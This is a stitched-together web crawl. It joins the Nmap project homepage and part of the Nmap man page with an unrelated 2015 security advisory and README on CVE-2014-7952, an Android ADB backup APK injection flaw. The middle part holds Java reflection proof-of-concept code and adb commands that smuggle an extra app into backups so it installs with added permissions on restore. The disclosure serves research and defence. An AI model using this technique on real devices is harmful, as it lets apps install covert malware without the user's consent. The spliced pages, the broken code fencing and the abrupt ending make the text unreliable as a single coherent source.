# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

# CVE-2014-7952, Android ADB backup APK injection vulnerability

---

*From*: Imre RAD <imre.rad () search-lab hu>

*Date*: Fri, 10 Jul 2015 10:48:00 +0200

---

```
The Android operating system offers a backup/restore mechanism of
installed packages through the ADB utility. Full backup of applications
including the private files stored on /data partition is performed by
default, but applications can customize this behavior by implementing a
BackupAgent class. This way they can feed the backup process with custom
files and data.

SEARCH-LAB Ltd. discovered a vulnerability in the design of the Android
backup mechanism: the backup manager, which invokes the custom
BackupAgent does not filter the data stream returned by the
applications. A malicious BackupAgent (without any Android permissions)
is able to inject additional applications (APKs) through reflection into
the backup archive without the user's consent. Upon restoration of the
backup archive, the system installs the injected, additional application
(since it is already part of the backup archive). The installed malware
could gain any (non-system) permissions it wanted without any
confirmation dialogs.

SEARCH-LAB Ltd. reported the vulnerability to the Android security team
on July 14, 2014, but the issue was still not fixed. This means as of
today, July 10, 2015 all current Android versions are affected,
including L (5.1.1).

# ADB-Backup-APK-Injection

Android ADB backup APK injection vulnerability discovered by and POC created by Imre Rad, SEARCH-LAB Ltd., Hungary.

## What is ADB backup/restore?

The Android operating system offers a backup/restore mechanism of installed packages through the ADB utility.
By default, full backup of applications including the private files stored in /data is performed, but this behaviour can be customized by implementing a [BackupAgent](http://developer.android.com/reference/android/app/backup/BackupAgent.html) class. This way applications can feed the backup process with custom files and data.
The backup file created is a simple compressed tar archive with some Android specific headers. Optional encryption is also possible.

## APK injection vulnerability

The backup manager, which invokes the custom BackupAgent does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. **The BackupAgent needs no Android permissions.** Upon restoration of the backup archive, the system installs the injected, additional application (since it is part of the backup archive and the system believes it is authentic) with **escalated privileges**.

So the danger is in a few words: an innocent-looking Android application can install new applications with extra permissions without the user's consent.

The Backup Manager can be exploited through simple reflection to inject the arbitrary additional APK:

```
// package name of the application to be injected. This will be one of the arguments of backupToTar() method
String packageName = "com.searchlab.wifitest";

Method backupToTar;
Method getData;
try {
	// looking up the internal Classes
	Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");
	Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");

	// fetching reference to the backupToTar method and making it accessible for us
	backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
	backupToTar.setAccessible(true);

	// we also need getData() method
	getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
	getData.setAccessible(true);

	// and now let the magic begin!
	Object backupData = getData.invoke(data);
	backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
	backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);

	// that's all, folks
	Log.v("MYBACKUP", "backuptotar invoked!");

} catch (Exception e) {
	e.printStackTrace();
}

```

## Who is affected?

The vulnerability resides in the backup mechanism of the Android operating system. Anyone using the adb tool for creating and restoring backups of their handsets might be affected. One could think that command line applications are used by geeks or programmers only, but not necessarily, there are Windows GUI applications which rely on the same technology behind the scenes when creating backups or restoring them.
The malware might come from an innocent looking game without any suspicion as it claims to need no permissions at all. As soon as backup was created, the archive is "infected". The injected application can use any (non-system) permissions, for example starting automatically at boot or sending SMS messages.

## Proof of Concept

In this repository you can find an application along with it's source code which can demonstrate the vulnerabilty.
It was tested on Android 4.4.4 and Android 5.1.1.

Step 1: Install ADB\_Backup\_Injection.apk (com.searchlab.backupagenttest):

[![ADB Backup Injection, custom BackupAgent](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-backupagenttest2.png "ADB Backup Injection, custom BackupAgent")](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-backupagenttest2.png)

This application *does not require any permissions*.

Step 2: Use the following command to create a backup of this package

```
adb backup -f backup.ab -apk com.searchlab.backupagenttest

```

(You could create a full system backup as well, the exploit would be still successful.)

Step 3 (optional): If you want to examine the backup archive just created, use the [ABE](https://github.com/nelenkov/android-backup-extractor) tool:

```
java -jar abe.jar unpack backup.ab backup.tar

```

[![ADB Backup Injection, the tar file with the injected content](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-tar-file.png "ADB Backup Injection, the tar file with the injected content")](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-tar-file.png)

In the tar file you will find the injected second application (com.searchlab.wifitest).

Step 4: Use the following command to restore the archive:

```
adb restore backup.ab

```

Since the backup.ab file already contains the injected application, it will be restored (installed) as well.

Step 5: Verify that Wifi Test application was indeed installed.
The application runs with android.permission.CHANGE\_WIFI\_STATE and android.permission.ACCESS\_WIFI\_STATE permissions to demonstrate that privilege escalation was also possible.

## CVE

The ID CVE-2014-7952 was assigned to this vulnerability.

## Affected Versions

As of today (2015-07-08), all Android versions are affected, including Android L.

## Timeline

SEARCH-LAB Ltd. responsibly reported this threat to the Android security team. At first, Google did not acknowledge the issue being security relevant. Later they kept requesting to hold off publishing as they needed more time for further investigation, but as of today, July 8, 2015 the bug was still not addressed. The most important milestones of the issue are listed in the next lines:

2014-07-14: The vulnerability was disclosed to the Android Security Team

2014-07-28: Google refused to treat the issue as a potential threat

...Couple of additional emails in this thread, Google kept investigating the issue and requested holding off the publication

2014-10-13: Asked Google for status update (and requested a cup or a mug for being patient)

2014-10-15: Google answered that the issue did not get fixed in the L release and requested to hold off publishing it. (Got a promise about asking around for a mug)

...Few more ping-pong emails periodically without any new info (neither a mug)

2015-06-02: Google promised further info in a few days, but it never arrived

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
